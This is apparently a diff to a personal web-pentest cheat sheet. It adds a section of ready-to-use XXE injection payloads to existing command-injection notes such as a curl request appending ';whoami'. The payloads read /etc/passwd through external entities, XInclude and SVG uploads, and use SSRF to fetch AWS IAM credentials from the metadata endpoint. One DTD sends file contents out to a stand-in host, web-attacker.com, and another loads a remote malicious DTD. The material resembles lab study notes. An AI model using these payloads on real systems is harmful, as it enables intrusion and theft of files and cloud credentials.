@@ -125,3 +125,51 @@ curl -b cookie --data-urlencode "productId=1;whoami" --data-urlencode "storeId=2
  0x0a, \n
  `command`
  $(command)
+
+
+
+# XXE Injection
+
+
+## Retrieve files
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
+
+## SSRF (server-side request forgery) attacks
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+
+
+## XInclude attacks
+
+productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
+
+
+## Via file upload
+
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="16" x="0" y="26">&xxe;</text>
+</svg>
+
+
+## Detecting blind XXE using out-of-band (OAST) techniques
+
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]> 
+
+## Exploiting blind XXE to exfiltrate data out-of-band
+
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
+%eval;
+%exfiltrate; 
+
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://web-attacker.com/malicious.dtd"> %xxe;]> 
